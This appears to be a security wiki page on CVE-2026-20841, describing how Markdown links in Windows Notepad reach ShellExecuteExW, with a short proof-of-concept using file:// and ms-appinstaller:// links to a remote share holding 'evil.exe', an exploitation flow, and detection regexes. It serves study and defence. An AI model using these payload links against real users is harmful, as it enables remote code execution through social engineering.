# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows applications that render Markdown/HTML often turn user-supplied links into clickable elements and hand them to `ShellExecuteExW`. Without strict scheme allowlisting, any registered protocol handler (e.g., `file:`, `ms-appinstaller:`) can be triggered, leading to code execution in the current user context.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad chooses Markdown mode **only for `.md` extensions** via a fixed string comparison in `sub_1400ED5D0()`.
- Supported Markdown links:
  - Standard: `[text](target)`
  - Autolink: `<target>` (rendered as `[target](target)`), so both syntaxes matter for payloads and detections.
- Link clicks are processed in `sub_140170F60()`, which performs weak filtering and then calls `ShellExecuteExW`.
- `ShellExecuteExW` dispatches to **any configured protocol handler**, not just HTTP(S).

### Payload considerations
- Any `\\` sequences in the link are **normalized to `\`** before `ShellExecuteExW`, impacting UNC/path crafting and detection.
- `.md` files are **not associated with Notepad by default**; the victim must still open the file in Notepad and click the link, but once rendered, the link is clickable.
- Dangerous example schemes:
  - `file://` to launch a local/UNC payload.
  - `ms-appinstaller://` to trigger App Installer flows. Other locally registered schemes may also be abusable.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Exploitation flow
1. Craft a **`.md` file** so Notepad renders it as Markdown.
2. Embed a link using a dangerous URI scheme (`file:`, `ms-appinstaller:`, or any installed handler).
3. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad.
4. On click, the **normalized link** is handed to `ShellExecuteExW` and the corresponding protocol handler executes the referenced content in the user’s context.

## Detection ideas
- Monitor transfers of `.md` files over ports/protocols that commonly deliver documents: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parse Markdown links (standard and autolink) and look for **case-insensitive** `file:` or `ms-appinstaller:`.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Patch behavior reportedly **allowlists local files and HTTP(S)**; anything else reaching `ShellExecuteExW` is suspicious. Extend detections to other installed protocol handlers as needed, since attack surface varies by system.

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
